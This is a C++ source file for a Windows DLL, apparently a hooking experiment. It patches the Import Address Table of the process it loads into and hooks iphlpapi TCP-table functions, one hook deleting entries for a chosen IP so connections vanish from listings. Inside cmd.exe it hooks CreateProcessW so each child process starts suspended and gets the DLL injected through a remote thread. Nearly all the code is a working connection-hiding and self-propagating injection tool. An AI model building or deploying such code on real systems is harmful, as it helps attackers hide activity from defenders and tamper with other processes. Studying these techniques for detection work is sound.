// dllmain.cpp : Defines the entry point for the DLL application.


#include "pch.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <iostream>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>


//structs of undocumented InternalGetBoundTcpEndpointTable
typedef struct {
    DWORD dwNumEntries;
    MIB_TCPROW table[ANY_SIZE];
} MIB_MYTCPTABLE, * PMIB_MYTCPTABLE;

//typedef struct {
//    DWORD dwState;
//    DWORD dwLocalAddr;
//    DWORD dwLocalPort;
//    DWORD dwRemoteAddr;
//    DWORD dwRemotePort;
//} MIB_TCPROW, * PMIB_TCPROW;

// define MessageBoxA prototype
using PrototypeMessageBox = int (WINAPI*)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// define CreateProcessW prototype
using PrototypeCreateProcessW = BOOL(WINAPI*)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// Prototype of GetTcpStatisticsEx
using PrototypeGetTcpStatisticsEx = DWORD(WINAPI*)(PMIB_TCPSTATS pStats, ULONG Family);
// Prototypr of InternalGetBoundTcpEndpointTable
using PrototypeInternalGetBoundTcpEndpointTable = DWORD(WINAPI*)(PVOID pTcpTable, PDWORD pdwSize, BOOL order, ULONG af, TCP_TABLE_CLASS TableClass, ULONG Reserved);
//Prototype of InternalGetTcpTable2
using PrototypeInternalGetTcpTable2 = DWORD(WINAPI*)(PMIB_TCPTABLE2 pTcpTable, PULONG pdwSize, BOOL bOrder);
//Prototype of GetTcpTable2
using PrototypeGetTcpTable2 = DWORD(WINAPI*)(PMIB_TCPTABLE2 pTcpTable, PULONG pdwSize, BOOL bOrder);
//Prototype of InternalGetTcpTableWithOwnerModule
using PrototypeInternalGetTcpTableWithOwnerModule = DWORD(WINAPI*)(PVOID Table, PDWORD Size, BOOL Order, ULONG ulAf, ULONG TableClass, ULONG Reserved);
// Prototype of MultiByteToWideChar
using PrototypeMultiByteToWideChar = int(WINAPI*)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// Prototype of WideCharToMultiByte
using PrototypeWideCharToMultiByte = int(WINAPI*)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);


bool InjectDLL(DWORD pid, const char* dllPath);

// remember memory address of the original MessageBoxA routine
PrototypeMessageBox originalMsgBox = MessageBoxW;
// Pointer to store the original CreateProcessW function
PrototypeCreateProcessW originalCreateProcessW = nullptr;
// Pointer to store the original GetTcpStatisticsEx function
PrototypeGetTcpStatisticsEx originalGetTcpStatisticsEx = nullptr;
// Pointer to store the original InternalGetBoundTcpEndpointTable function
PrototypeInternalGetBoundTcpEndpointTable originalInternalGetBoundTcpEndpointTable = nullptr;
//Pointer to store the original InternalGetTcpTable2 function
PrototypeInternalGetTcpTable2 originalInternalGetTcpTable2 = nullptr;
//Pointer to store the original GetTcpTable2 function
PrototypeGetTcpTable2 originalGetTcpTable2 = nullptr;
//Pointer to store the original InternalGetTcpTableWithOwnerModule function
PrototypeInternalGetTcpTableWithOwnerModule originalInternalGetTcpTableWithOwnerModule = nullptr;
//Pointer to store the original MultiByteToWideChar function
PrototypeMultiByteToWideChar originalMultiByteToWideChar = nullptr;
//Pointer to store the original WideCharToMultiByte function
PrototypeWideCharToMultiByte originalWideCharToMultiByte = nullptr;



// hooked function with malicious code that eventually calls the original MessageBoxA
int hookedMessageBox(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
{
    MessageBoxW(NULL, L"Hooked by Daniel Ayzenshteyn", L"Ayo!", 0);
    // execute the original NessageBoxA
    return originalMsgBox(hWnd, lpText, lpCaption, uType);
}

DWORD WINAPI HookedGetTcpStatisticsEx(PMIB_TCPSTATS pStats, ULONG Family)
{
    std::cout << "Hooked GetTcpStatisticsEx called" << std::endl;
    // Optionally, modify input, call original function, or log calls
    DWORD result = originalGetTcpStatisticsEx(pStats, Family);

    // Example: Log the number of active connections
    printf("Active Connections: %lu\n", pStats->dwActiveOpens);

    // Return the original call's result
    return result;
}

DWORD WINAPI HookedInternalGetBoundTcpEndpointTable(PVOID pTcpTable, PDWORD pdwSize, BOOL order, ULONG af, TCP_TABLE_CLASS TableClass, ULONG Reserved) {
    std::cout << "Hooked InternalGetBoundTcpEndpointTable called" << std::endl;
    // Call the original function first
    DWORD result = originalInternalGetBoundTcpEndpointTable(pTcpTable, pdwSize, order, af, TableClass, Reserved);

    // Check result for success
    if (result != NO_ERROR) return result;

    // Assume pTcpTable is pointing to our hypothetical MIB_MYTCPTABLE
    PMIB_MYTCPTABLE pMyTcpTable = (PMIB_MYTCPTABLE)pTcpTable;

    // The IP address we want to filter out, converted to network byte order
    ULONG bannedIp = htonl(inet_addr("10.100.102.2"));

    // Iterate over the table and filter
    for (DWORD i = 0; i < pMyTcpTable->dwNumEntries; ) {
        if (pMyTcpTable->table[i].dwLocalAddr == bannedIp) {
            // If entry matches the condition, remove it by shifting the rest
            if (i < pMyTcpTable->dwNumEntries - 1) {
                memmove(&pMyTcpTable->table[i], &pMyTcpTable->table[i + 1], (pMyTcpTable->dwNumEntries - i - 1) * sizeof(MIB_TCPROW));
            }
            // Decrease the count of entries
            pMyTcpTable->dwNumEntries--;
        }
        else {
            i++;
        }
    }

    return result;
}

void PrintTcpTable(PMIB_TCPTABLE2 pTcpTable) {
    // Iterate through the table entries
    int conuter = 0;
    std::cout << "Number of entries: " << pTcpTable->dwNumEntries << std::endl;
    for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
        MIB_TCPROW2 row = pTcpTable->table[i];

        // Convert the IP address to readable format
        //struct in_addr IpAddr;
        //IpAddr.S_un.S_addr = (u_long)row.dwLocalAddr;
        //char* strIpAddr = inet_ntoa(IpAddr);

        // Convert the port from network byte order to host byte order
        //USHORT localPort = ntohs((u_short)row.dwLocalPort);
        //USHORT remotePort = ntohs((u_short)row.dwRemotePort);

        //printf("Local Address: %s, Local Port: %u\n", strIpAddr, localPort);
        std::cout << "Local Address: " << row.dwLocalAddr << ", Local Port: " << row.dwLocalPort << std::endl;
        //printf("Remote Address: %s, Remote Port: %u\n", inet_ntoa(*(struct in_addr*)&row.dwRemoteAddr), remotePort);
        std::cout << "Remote Address: " << row.dwRemoteAddr << ", Remote Port: " << row.dwRemotePort << std::endl;
        //printf("State: %lu\n", row.dwState); // State of the TCP connection
        conuter++;
        if (conuter == 30) {
            break;
        }
    }
}

// Prototype for the function to filter the TCP table
void FilterTcpTableByLocalIp(PMIB_TCPTABLE2 pTcpTable, ULONG ipToFilter) {
    if (pTcpTable == nullptr) return;

    std::vector<MIB_TCPROW2> filteredEntries;
    for (DWORD i = 0; i < pTcpTable->dwNumEntries; ++i) {
        MIB_TCPROW2& row = pTcpTable->table[i];
        if (row.dwLocalAddr != ipToFilter) {
            filteredEntries.push_back(row);
        }
    }

    // Copy the filtered entries back to the original table
    memcpy(pTcpTable->table, filteredEntries.data(), filteredEntries.size() * sizeof(MIB_TCPROW2));
    pTcpTable->dwNumEntries = static_cast<DWORD>(filteredEntries.size());
}


void ChangeLocalIpInTcpTable(PMIB_TCPTABLE2 pTcpTable, ULONG ipToMatch, ULONG ipToSet) {
    if (pTcpTable == nullptr) return;

    for (DWORD i = 0; i < pTcpTable->dwNumEntries; ++i) {
        MIB_TCPROW2& row = pTcpTable->table[i];
        if (row.dwLocalAddr == ipToMatch) {
            row.dwLocalAddr = ipToSet; 
        }
    }
}



//DWORD WINAPI HookedInternalGetTcpTable2(PMIB_TCPTABLE2 pTcpTable, PULONG pdwSize, BOOL bOrder) {
//    std::cout << "Hooked InternalGetTcpTable2 called" << std::endl;
//    // Call the original function to fill pTcpTable
//    
//    //ULONG filteredIp = inet_addr("10.100.102.2");
//    std::cout << "1" << std::endl;
//
//    DWORD dwSize = 0;
//    DWORD dwRetVal = 0;
//    // Call GetTcpTable2 first to get the necessary size
//    dwRetVal = originalInternalGetTcpTable2(NULL, &dwSize, TRUE);
//    std::cout << "2" << std::endl;
//
//    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
//        //PMIB_TCPTABLE2 pTcpTable = (PMIB_TCPTABLE2)malloc(dwSize);
//        std::cout << "3" << std::endl;
//        if (pTcpTable != NULL) {
//            // Call GetTcpTable2 again to get the actual data
//            if ((dwRetVal = originalInternalGetTcpTable2(pTcpTable, &dwSize, TRUE)) == NO_ERROR) {
//                std::cout << "4" << std::endl;
//                PrintTcpTable(pTcpTable);
//                //ULONG ipToFilter = inet_addr("10.100.102.2");
//                //FilterTcpTableByLocalIp(pTcpTable, ipToFilter);
//                std::cout << "****************************" << std::endl;
//                ULONG ipToMatch = inet_addr("10.100.102.2");
//                ULONG ipToSet = inet_addr("8.8.8.8");
//                //ChangeLocalIpInTcpTable(pTcpTable, ipToMatch, ipToSet);
//                PrintTcpTable(pTcpTable);
//            }
//            //free(pTcpTable);
//        }
//    }
//
//    if (dwRetVal != NO_ERROR) {
//        printf("GetTcpTable2 failed with %d\n", dwRetVal);
//    }
//    std::cout << "Finished Hooked InternalGetTcpTable2 call" << std::endl;
//
//    //DWORD result = originalInternalGetTcpTable2(pTcpTable, pdwSize, bOrder);
//    //return result;
//    return dwRetVal;
//}

DWORD WINAPI HookedInternalGetTcpTable2(PMIB_TCPTABLE2 pTcpTable, PULONG pdwSize, BOOL bOrder) {
    std::cout << "Hooked InternalGetTcpTable2 called" << std::endl;
 //   // Call the original function to fill pTcpTable
 //   DWORD dwSize = 0;
 //   DWORD dwRetVal = 0;
 //   dwRetVal = originalInternalGetTcpTable2(NULL, &dwSize, TRUE);
 //   if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
 //       PMIB_TCPTABLE2 pTcpTable_new = (PMIB_TCPTABLE2)malloc(dwSizeMy);

 //       if (pTcpTable_new != NULL) {
 //           // Call GetTcpTable2 again to get the actual data
 //           std::cout << "Calling original InternalGetTcpTable2 after alocation of " << dwSize << dwSizeMy << std::endl;
 //           if ((dwRetVal = originalInternalGetTcpTable2(pTcpTable_new, pdwSize, bOrder)) == NO_ERROR) {
 //               PrintTcpTable(pTcpTable_new);
 //           }
 //       }

	//}

 //   
 //   

 //   if (dwRetVal != NO_ERROR) {
 //       printf("GetTcpTable2 failed with %d\n", dwRetVal);
 //   }
 //   std::cout << "Finished Hooked InternalGetTcpTable2 call" << std::endl;
    DWORD result = originalGetTcpTable2(pTcpTable, pdwSize, bOrder);
    //DWORD result = originalInternalGetTcpTable2(pTcpTable, pdwSize, bOrder);
    //PrintTcpTable(pTcpTable);
    return result;
    //return dwRetVal;
}

DWORD WINAPI HookedInternalGetTcpTableWithOwnerModule(PVOID Table, PDWORD Size, BOOL Order, ULONG ulAf, ULONG TableClass, ULONG Reserved) {
    std::cout << "InternalGetTcpTableWithOwnerModule Hooked!" << std::endl;

    // Call the original function
    DWORD result = originalInternalGetTcpTableWithOwnerModule(Table, Size, Order, ulAf, TableClass, Reserved);

    // Here, you can modify the output if needed

    return result;
}

// Hook function that matches the prototype of MultiByteToWideChar
int WINAPI HookedMultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar) {
    std::cout << "MultiByteToWideChar called with: " << lpMultiByteStr << std::endl;

    // Call the original function with the parameters passed to this hooked version
    return originalMultiByteToWideChar(CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar);
}

// Hook function that matches the prototype of WideCharToMultiByte
int WINAPI HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	std::cout << "WideCharToMultiByte called with: " << lpWideCharStr << std::endl;

	// Call the original function with the parameters passed to this hooked version
	return originalWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
}



void SaveOriginalGetTcpStatisticsEx() {
    HMODULE hModule = GetModuleHandle(L"iphlpapi.dll");
    if (hModule) {
        FARPROC pFunc = GetProcAddress(hModule, "GetTcpStatisticsEx");
        if (pFunc) {
            originalGetTcpStatisticsEx = (PrototypeGetTcpStatisticsEx)pFunc;
            std::cout << "Original GetTcpStatisticsEx saved" << std::endl;
        }
    }
}

void SaveOriginalInternalGetBoundTcpEndpointTable() {
    HMODULE hModule = GetModuleHandle(L"iphlpapi.dll");
    if (hModule) {
        FARPROC pFunc = GetProcAddress(hModule, "InternalGetBoundTcpEndpointTable");
        if (pFunc) {
            originalInternalGetBoundTcpEndpointTable = (PrototypeInternalGetBoundTcpEndpointTable)pFunc;
            std::cout << "Original InternalGetBoundTcpEndpointTable saved" << std::endl;
        }
    }
}

void SaveInternalGetTCPTable2() {
	HMODULE hModule = GetModuleHandleW(L"iphlpapi.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "InternalGetTcpTable2");
        //FARPROC pFunc = GetProcAddress(hModule, "GetTcpTable2");
        if (pFunc) {
			originalInternalGetTcpTable2 = (PrototypeInternalGetTcpTable2)pFunc;
			std::cout << "Original InternalGetTcpTable2 saved" << std::endl;
            //originalInternalGetTcpTable2(NULL, NULL, TRUE);
            //std::cout << "Original InternalGetTcpTable2 called" << std::endl;
		}
	}
}

void SaveGetTcpTable2() {
	HMODULE hModule = GetModuleHandleW(L"iphlpapi.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "GetTcpTable2");
        if (pFunc) {
			originalGetTcpTable2 = (PrototypeGetTcpTable2)pFunc;
			std::cout << "Original GetTcpTable2 saved" << std::endl;
		}
	}
}

void SaveInternalGetTcpTableWithOwnerModule() {
	HMODULE hModule = GetModuleHandle(L"iphlpapi.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "InternalGetTcpTableWithOwnerModule");
        if (pFunc) {
			originalInternalGetTcpTableWithOwnerModule = (PrototypeInternalGetTcpTableWithOwnerModule)pFunc;
			std::cout << "Original InternalGetTcpTableWithOwnerModule saved" << std::endl;
		}
	}
}

void SaveOriginalMultiByteToWideChar() {
	HMODULE hModule = GetModuleHandle(L"api-ms-win-core-string-l1-1-0.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "MultiByteToWideChar");
        if (pFunc) {
			originalMultiByteToWideChar = (PrototypeMultiByteToWideChar)pFunc;
			std::cout << "Original MultiByteToWideChar saved" << std::endl;
		}
	}
}

void SaveOriginalWideCharToMultiByte() {
	HMODULE hModule = GetModuleHandle(L"api-ms-win-core-string-l1-1-0.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "WideCharToMultiByte");
        if (pFunc) {
			originalWideCharToMultiByte = (PrototypeWideCharToMultiByte)pFunc;
			std::cout << "Original WideCharToMultiByte saved" << std::endl;
		}
	}
}

void SaveOriginalCreateProcessW() {
	HMODULE hModule = GetModuleHandle(L"api-ms-win-core-processthreads-l1-1-0.dll");
    if (hModule) {
		FARPROC pFunc = GetProcAddress(hModule, "CreateProcessW");
        if (pFunc) {
			originalCreateProcessW = (PrototypeCreateProcessW)pFunc;
			std::cout << "Original CreateProcessW saved" << std::endl;
		}
	}
}

BOOL WINAPI MyCreateProcess(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation)
{
    std::cout << "Hooked MyCreateProcessW called" << std::endl;
    // Modify the creation flags to ensure the process starts suspended
    dwCreationFlags = CREATE_SUSPENDED;

    // Call the original CreateProcess function with modified flags
    BOOL result = CreateProcess(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

    std::cout << "Process ID: " << lpProcessInformation->dwProcessId << std::endl;

    if (result) {
        // Inject the DLL into the newly created, suspended process
        if (InjectDLL(lpProcessInformation->dwProcessId, "C:\\Users\\user\\source\\repos\\IAThooking\\x64\\Debug\\IAThooking.dll")) {
            // Resume the thread after successful injection
            std::cout << "Resuming thread after successful injection" << std::endl;
            ResumeThread(lpProcessInformation->hThread);
        }
    }

    return result;
}


// Function to get a pointer to the IAT.
PIMAGE_IMPORT_DESCRIPTOR GetIATPointer(LPVOID imageBase) {

    // get the DOS header
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
    // get the NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
    // get the import descriptor
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
    return importDescriptor; // This points to the IAT.
}

//PatchIAT function to patch the IAT.
bool HookIAT(LPCSTR importModuleName, LPCSTR importFunctionName, DWORD_PTR newFunction) {
    // get the base address of the current module
    LPVOID imageBase = GetModuleHandle(NULL);

    // Get the IAT pointer
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = GetIATPointer(imageBase);
    if (importDescriptor == NULL) {
        std::cout << "IAT not found" << std::endl;
        return false;
    }

    std::cout << "IAT found" << std::endl;

    LPCSTR libraryName = NULL;
    HMODULE library = NULL;
    PIMAGE_IMPORT_BY_NAME functionName = NULL;


    // Loop through the import descriptors to find the one we want
    while (importDescriptor->Name != NULL) {

        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)imageBase;
        
        //std::cout << "Module name: " << libraryName << std::endl;

        if (strcmp(libraryName, importModuleName) == 0) {

            std::cout << "Module found: " << libraryName << std::endl;

            // Get the original and first thunk
            PIMAGE_THUNK_DATA originalFirstThunk = NULL;
            PIMAGE_THUNK_DATA firstThunk = NULL;
            originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
            firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);

            // Loop through the import address table
            while (originalFirstThunk->u1.AddressOfData != NULL)
            {
                functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData);

                //std::cout << "Function name: " << functionName->Name << std::endl;

                // find MessageBoxA address
                if (std::string(functionName->Name).compare(importFunctionName) == 0)
                {
                    std::cout << "Function found: " << functionName->Name << std::endl;

                    SIZE_T bytesWritten = 0;
                    DWORD oldProtect = 0;
                    VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);

                    // swap MessageBoxA address with address of hookedMessageBox
                    firstThunk->u1.Function = newFunction;

                    std::cout << "Function hooked: " << functionName->Name << std::endl;

                    VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, oldProtect, &oldProtect);
                }
                ++originalFirstThunk;
                ++firstThunk;
            }
        }
        importDescriptor++;
    }
    return true;
}


bool InjectDLL(DWORD pid, const char* dllPath) {
    // 1. Retrieve the address of LoadLibraryA from the current process
    HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        std::cerr << "Error: Could not find LoadLibraryA function address.\n";
        return false;
    }

    // 2. Open the target process, allocate memory, and write the DLL path to it
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Error: Could not open target process.\n";
        return false;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        std::cerr << "Error: Could not allocate memory in target process.\n";
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, (void*)dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Error: Could not write to process memory.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 3. Create a remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Error: Could not create remote thread.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "DLL injection successful.\n";

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Cleanup successful.\n";
    return true;
}

bool IsCurrentProcessPowershell() {
    WCHAR filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH);

    // Extract the name of the executable from the file path
    std::wstring fileName = std::wstring(filePath).substr(std::wstring(filePath).find_last_of(L"\\/") + 1);

    // Compare (case-insensitive) with "powershell.exe"
    return (_wcsicmp(fileName.c_str(), L"cmd.exe") == 0);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Hook the IAT
        std::cout << "***************** IAT Hooking ATTACH - Start ***************" << std::endl;
        //MessageBoxA(NULL, "IAT Hooking", "IAT Hooking", MB_OK);
        if (IsCurrentProcessPowershell()) {
            SaveOriginalCreateProcessW();
            HookIAT("api-ms-win-core-processthreads-l1-1-0.dll", "CreateProcessW", (DWORD_PTR)MyCreateProcess);
        }
        else {
            //HookIAT("USER32.dll", "MessageBoxW", (DWORD_PTR)hookedMessageBox);
            SaveOriginalGetTcpStatisticsEx();
            HookIAT("IPHLPAPI.DLL", "GetTcpStatisticsEx", (DWORD_PTR)HookedGetTcpStatisticsEx);
            SaveOriginalInternalGetBoundTcpEndpointTable();
            HookIAT("IPHLPAPI.DLL", "InternalGetBoundTcpEndpointTable", (DWORD_PTR)HookedInternalGetBoundTcpEndpointTable);
            SaveInternalGetTCPTable2();
            SaveGetTcpTable2();
            HookIAT("IPHLPAPI.DLL", "InternalGetTcpTable2", (DWORD_PTR)HookedInternalGetTcpTable2);
            SaveInternalGetTcpTableWithOwnerModule();
            HookIAT("IPHLPAPI.DLL", "InternalGetTcpTableWithOwnerModule", (DWORD_PTR)HookedInternalGetTcpTableWithOwnerModule);
            SaveOriginalMultiByteToWideChar();
            HookIAT("api-ms-win-core-string-l1-1-0.dll", "MultiByteToWideChar", (DWORD_PTR)HookedMultiByteToWideChar);
            SaveOriginalWideCharToMultiByte();
            HookIAT("api-ms-win-core-string-l1-1-0.dll", "WideCharToMultiByte", (DWORD_PTR)HookedWideCharToMultiByte);
        }
        std::cout << "***************** IAT Hooking ATTACH - End ***************" << std::endl;
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        // Unhook the IAT
        std::cout << "***************** IAT Hooking DETACH - Start ***************" << std::endl;
        if (IsCurrentProcessPowershell()) {
			HookIAT("api-ms-win-core-processthreads-l1-1-0.dll", "CreateProcessW", (DWORD_PTR)originalCreateProcessW);
        }
        else {
            HookIAT("IPHLPAPI.DLL", "GetTcpStatisticsEx", (DWORD_PTR)originalGetTcpStatisticsEx);
            HookIAT("IPHLPAPI.DLL", "InternalGetBoundTcpEndpointTable", (DWORD_PTR)originalInternalGetBoundTcpEndpointTable);
            HookIAT("IPHLPAPI.DLL", "InternalGetTcpTable2", (DWORD_PTR)originalInternalGetTcpTable2);
            HookIAT("IPHLPAPI.DLL", "InternalGetTcpTableWithOwnerModule", (DWORD_PTR)originalInternalGetTcpTableWithOwnerModule);
            HookIAT("api-ms-win-core-string-l1-1-0.dll", "MultiByteToWideChar", (DWORD_PTR)originalMultiByteToWideChar);
            HookIAT("api-ms-win-core-string-l1-1-0.dll", "WideCharToMultiByte", (DWORD_PTR)originalWideCharToMultiByte); 
        }
        std::cout << "***************** IAT Hooking DETACH - End ***************" << std::endl;
        break;
    }
    return TRUE;
}

